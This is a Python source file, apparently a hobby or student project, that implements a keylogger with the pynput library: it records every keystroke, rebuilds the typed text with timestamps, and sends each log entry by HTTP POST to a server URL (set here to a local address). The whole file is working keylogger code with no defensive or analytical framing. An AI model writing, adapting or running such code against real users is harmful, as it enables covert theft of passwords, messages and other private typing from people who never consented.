from pynput.keyboard import Key, Listener
import datetime
import requests

SERVER_URL = "http://127.0.0.1:5000/log"

class KeyLogger:
    def __init__(self, file='kodcode.json'):
        self.pressed_keys = []
        self.log_dict = {}
        self.now = None
        self.file = file

    def on_press(self, key):
        self.pressed_keys.append(str(key))

        if self.pressed_keys[-4:] == ["'s'", "'h'", "'o'", "'w'"]:
            for time, value in self.log_dict.items():
                print(time + '\n' + '  ' + value)

        if self.pressed_keys[-1] in ['Key.space', 'Key.enter', 'Key.esc']:
            self.logger(self.pressed_keys)
            self.pressed_keys = []

        if len(self.log_dict) > 1:
            print("More than one log entry → writing older entry to file.")
            not_now = list(self.log_dict.keys())[-2]
            self.write_file(not_now)
            del self.log_dict[not_now]

    def logger(self, keys):
        ct = datetime.datetime.now()
        self.now = ct.strftime("%d-%m-%y %H:%M ")

        data_str = ''
        for key in keys:
            k = str(key).replace("'", "")
            if 'backspace' in k:
                data_str = data_str[:-1]
            elif 'space' in k:
                data_str += ' '
            elif 'enter' in k:
                data_str += '\n'
            elif 'Key' not in k:
                data_str += k

        if self.now in self.log_dict:
            self.log_dict[self.now] += data_str
        else:
            self.log_dict[self.now] = data_str
            print(self.log_dict)

    def write_file(self, key):       
        try:
            data = {
                "time": key,
                "text": self.log_dict[key]
            }
            requests.post(SERVER_URL, json=data)
        except Exception as e:
            print(f"Failed to send log to server: {e}")

    def on_release(self, key):  # type: ignore
        if key == Key.esc:
            self.write_file(self.now)
            return False


    def run(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()


if __name__ == "__main__":
    logger = KeyLogger()
    logger.run()
